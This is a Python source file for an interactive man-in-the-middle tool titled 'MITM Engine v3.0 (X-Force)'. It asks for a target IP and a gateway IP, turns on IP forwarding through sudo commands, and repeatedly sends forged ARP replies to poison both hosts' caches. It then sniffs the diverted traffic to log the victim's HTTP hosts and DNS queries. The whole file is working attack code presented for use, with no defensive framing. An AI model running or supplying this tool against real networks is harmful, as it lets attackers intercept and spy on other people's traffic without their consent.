import os
import time
import threading
import signal
import sys
from scapy.all import ARP, sendp, Ether, srp, IP, TCP, UDP, sniff, conf, Raw
from rich.console import Console
from rich.table import Table
from core.ui import draw_header

console = Console()


class MITMEngine:
    def __init__(self):
        self.running = True
        self.target_ip = ""
        self.router_ip = ""
        self.interface = ""
        self.target_mac = ""
        self.router_mac = ""
        self.stop_event = threading.Event()

    def get_interfaces(self):
        """Filters for primary physical interfaces with active IPs."""
        all_ifaces = conf.ifaces.data.values()
        filtered = []
        physical_prefixes = ('wlan', 'wl', 'en', 'eth')
        ignore_prefixes = ('lo', 'utun', 'gif', 'stf',
                           'bridge', 'anpi', 'awdl', 'llw')

        for iface in all_ifaces:
            name = iface.name.lower()
            if name.startswith(physical_prefixes) and not name.startswith(ignore_prefixes):
                if iface.ip and iface.ip not in ("127.0.0.1", "0.0.0.0"):
                    filtered.append(iface.name)
        return sorted(filtered)

    def toggle_forwarding(self, state=True):
        """Enables or disables IP forwarding on the host OS."""
        value = 1 if state else 0
        try:
            if sys.platform == 'darwin':
                os.system(
                    f"sudo sysctl -w net.inet.ip.forwarding={value} > /dev/null")
            else:
                os.system(
                    f"echo {value} | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
        except Exception as e:
            console.print(
                f"[yellow][!] Manual forwarding config failed: {e}[/yellow]")

    def get_mac(self, ip):
        """Resolves MAC address with a retry mechanism."""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                         timeout=3, retry=2, verbose=False, iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
        except:
            return None

    def packet_callback(self, packet):
        """Extracts and logs meaningful data from intercepted traffic."""
        if packet.haslayer(IP):
            ip_layer = packet.getlayer(IP)

            # Identify Protocol
            proto = "IP"
            if packet.haslayer(TCP):
                proto = "TCP"
            elif packet.haslayer(UDP):
                proto = "UDP"

            # Log HTTP Data
            if packet.haslayer(Raw):
                payload = str(packet[Raw].load)
                if "GET" in payload or "POST" in payload:
                    try:
                        url = payload.split('Host: ')[1].split('\\r\\n')[0]
                        console.print(
                            f"[bold green][HTTP][/bold green] {ip_layer.src} -> [yellow]{url}[/yellow]")
                    except:
                        pass

            # Log DNS Queries
            elif packet.haslayer(UDP) and packet[UDP].dport == 53:
                try:
                    qname = packet[DNSQR].qname.decode()
                    console.print(
                        f"[bold magenta][DNS][/bold magenta] {ip_layer.src} queried: [white]{qname}[/white]")
                except:
                    pass

    def poison(self):
        """Asynchronous poisoning loop."""
        target_pkt = Ether(dst=self.target_mac) / ARP(op=2,
                                                      pdst=self.target_ip, hwdst=self.target_mac, psrc=self.router_ip)
        router_pkt = Ether(dst=self.router_mac) / ARP(op=2,
                                                      pdst=self.router_ip, hwdst=self.router_mac, psrc=self.target_ip)

        while not self.stop_event.is_set():
            sendp(target_pkt, verbose=False, iface=self.interface)
            sendp(router_pkt, verbose=False, iface=self.interface)
            time.sleep(1.5)

    def restore(self):
        """Restores the ARP tables of the target and router."""
        console.print("\n[yellow][*] Restoring network integrity...[/yellow]")
        res_target = Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip,
                                                      hwdst=self.target_mac, psrc=self.router_ip, hwsrc=self.router_mac)
        res_router = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip,
                                                      hwdst=self.router_mac, psrc=self.target_ip, hwsrc=self.target_mac)

        for _ in range(5):
            sendp(res_target, verbose=False, iface=self.interface)
            sendp(res_router, verbose=False, iface=self.interface)
            time.sleep(0.2)

        self.toggle_forwarding(False)
        console.print("[green][+] Network restored.[/green]")

    def run(self):
        draw_header("MITM Engine v3.0 (X-Force)")

        ifaces = self.get_interfaces()
        if not ifaces:
            console.print(
                "[red][!] No active physical interfaces found.[/red]")
            return

        # Interface Selection UI
        table = Table(title="Network Interfaces", border_style="cyan")
        table.add_column("ID", justify="center")
        table.add_column("Interface")
        table.add_column("IP Address")

        for i, name in enumerate(ifaces):
            ip = conf.ifaces.dev_from_name(name).ip
            table.add_row(str(i), name, ip)

        console.print(table)
        try:
            idx = int(console.input(
                "[bold yellow]Select Interface ID: [/bold yellow]"))
            self.interface = ifaces[idx]
        except:
            return console.print("[red]Invalid selection.[/red]")

        self.target_ip = console.input(
            "[bold yellow]Target IP Address: [/bold yellow]").strip()
        self.router_ip = console.input(
            "[bold yellow]Gateway (Router) IP: [/bold yellow]").strip()

        # Resolution
        with console.status("[bold cyan]Resolving MAC addresses..."):
            self.target_mac = self.get_mac(self.target_ip)
            self.router_mac = self.get_mac(self.router_ip)

        if not self.target_mac or not self.router_mac:
            console.print(
                "[red]Critical Error: Could not resolve MACs. Check connectivity.[/red]")
            return

        self.toggle_forwarding(True)

        # Start Poisoning Thread
        poison_thread = threading.Thread(target=self.poison, daemon=True)
        poison_thread.start()

        # Start Sniffing
        console.print(
            f"[bold red][!] Interception Active: {self.target_ip} <--> {self.router_ip}[/bold red]")
        console.print("[dim]Press Ctrl+C to stop the attack[/dim]\n")

        try:
            sniff(iface=self.interface, prn=self.packet_callback,
                  store=0, stop_filter=lambda p: self.stop_event.is_set())
        except KeyboardInterrupt:
            self.stop_event.set()
            self.restore()
        except Exception as e:
            console.print(f"[red]Execution Error: {e}[/red]")
            self.stop_event.set()
            self.restore()


if __name__ == "__main__":
    engine = MITMEngine()
    engine.run()
